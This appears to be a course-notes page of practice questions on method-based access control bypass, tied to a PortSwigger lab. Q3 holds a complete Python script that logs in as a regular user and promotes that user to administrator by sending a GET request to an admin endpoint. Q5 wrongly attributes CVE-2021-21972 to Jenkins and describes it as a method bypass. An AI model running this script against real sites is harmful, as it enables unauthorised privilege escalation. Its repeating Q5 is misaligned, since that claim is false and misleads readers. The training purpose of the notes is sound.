---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain how method-based access control can be circumvented in web applications.**

Method-based access control relies on the HTTP method (e.g., GET, POST) to enforce security policies. However, this approach can be circumvented if the server does not properly validate the user's permissions beyond the HTTP method. For instance, if a POST request is required to perform an administrative action, an attacker might attempt to perform the same action via a GET request if the server does not enforce additional checks for user privileges. This can lead to unauthorized actions being executed, such as promoting a regular user to an administrator.

**Q2. How would you exploit a method-based access control vulnerability to promote a regular user to an administrator?**

To exploit a method-based access control vulnerability, you would first identify an administrative action that requires a specific HTTP method, such as a POST request. Then, you would attempt to perform the same action using a different HTTP method, such as a GET request. If the server does not properly check the user's privileges beyond the HTTP method, the action may succeed, promoting the regular user to an administrator.

For example, if the server allows a POST request to `/admin/roles` to promote a user, you could try sending a GET request to the same endpoint with the necessary parameters to promote the user. If the server does not enforce proper access controls, the promotion will occur.

**Q3. Write a Python script to automate the exploitation of a method-based access control vulnerability.**

```python
import requests
import sys

def disable_warnings():
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def promote_to_admin(session, url):
    # Define the login URL and credentials
    login_url = f"{url}/login"
    login_data = {
        'username': 'regular_user',
        'password': 'password'
    }

    # Perform the login request
    r = session.post(login_url, data=login_data, verify=False)
    if 'logout' in r.text:
        print("Successfully logged in as the regular user.")
    else:
        print("Could not log in as the regular user.")
        return False

    # Define the URL for promoting a user to admin
    promote_url = f"{url}/admin/roles?username=regular_user&action=upgrade"

    # Perform the GET request to promote the user
    r = session.get(promote_url, verify=False)
    if 'admin panel' in r.text:
        print("Successfully promoted the user to administrator.")
        return True
    else:
        print("Could not promote the user to administrator.")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print("Example: python3 script.py http://example.com")
        sys.exit(1)

    url = sys.argv[1]
    disable_warnings()
    session = requests.Session()

    if promote_to_admin(session, url):
        print("Exploit successful.")
    else:
        print("Exploit failed.")
```

**Q4. Why is it important to implement access controls beyond the HTTP method?**

Implementing access controls beyond the HTTP method is crucial because relying solely on the HTTP method for enforcing security policies can lead to vulnerabilities. Attackers can bypass these controls by using alternative methods or manipulating the request parameters. Proper access controls should include verifying the user's role and permissions, ensuring that only authorized users can perform certain actions regardless of the HTTP method used.

**Q5. Discuss a recent real-world example of a method-based access control vulnerability.**

A notable example is the CVE-2021-21972, which affected the Jenkins CI/CD platform. The vulnerability allowed attackers to bypass access controls by using a GET request instead of a POST request to perform administrative actions. This led to unauthorized access and potential privilege escalation. The issue highlights the importance of implementing robust access controls that go beyond the HTTP method to prevent such vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/12-Access Control Vulnerabilities/07-Lab 6 Method based access control can be circumvented/10-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/07-Lab 6 Method based access control can be circumvented/00-Overview|Overview]]
